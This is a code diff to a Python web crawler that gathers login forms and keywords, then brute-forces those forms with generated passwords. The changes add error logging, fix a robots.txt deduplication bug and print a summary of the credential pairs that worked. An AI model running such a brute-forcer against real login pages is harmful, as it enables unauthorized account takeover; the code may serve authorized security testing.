@@ -65,6 +65,8 @@ def process_node(start_url, node, header_dict, forms, keywords, seen, add_next, 
                     add_duplicate_url(url, seen)
                     # Traversal dependent function to add next node
                     add_next(url) 
+    else:
+        print('4xx/5xx error at: ' + node.url)
 
 def crawl_bfs(start_url, header_dict, counter, forms, keywords, seen):
     queue = collections.deque()
@@ -170,7 +172,7 @@ def crawl_robots(bfs, url, header_dict, counter, forms, keywords, seen):
     new_links = list(map(lambda x: x.split(' ')[1], allow_disallow))
     appended_links = list(map(lambda x: '{}{}'.format(url, x), new_links))
     for link in appended_links:
-        if url not in seen:
+        if link not in seen:
             try:
                 if bfs:
                     crawl_bfs(link, header_dict, counter, forms, keywords, seen)
@@ -181,7 +183,7 @@ def crawl_robots(bfs, url, header_dict, counter, forms, keywords, seen):
             
 def brute_force(user, keywords, forms, user_agent):
     passwords = generate_all_passwords(keywords)
-
+    results = {}
     for form in forms:
         print('\nAttempting to brute-force: ' + form + '\n')
         get_header = {'User-Agent': user_agent}
@@ -205,19 +207,32 @@ def brute_force(user, keywords, forms, user_agent):
                 while get_status(response) >= 500:
                     response = post_request(form, post, login)
 
-                print('Attempting to login...\nUser: ' + user + '\nPassword: ' + password)
+                combination = 'User: ' + user + '\nPassword: ' + password
+                print('Attempting to login...\n' + combination)
 
                 if get_status(response) == 302:
                     print('Login Succeeded!\n')
                     done = True
+                    results[form] = combination
                 else:
                     print('Login Failed...\n')
         
         if not done:
             print('Ran out of passwords! Bruteforce failed!')
+            results[form] = None
         
         sleep(5) # Temporary pause between forms to see end result of the current form
-          
+    
+    # Print bruteforce results
+    print('Bruteforcer Results')
+    print('-' * 50)
+    for form, combination in results.items():
+        print('Form: ' + form)
+        if combination is None:
+            print('Bruteforce Failed')
+        else:
+            print(combination)
+       
 def main():
     parser = argparse.ArgumentParser(description='Arguments to proceed web-crawling')
     parser.add_argument('-url', nargs=1, type=str, help='URL', required=True)
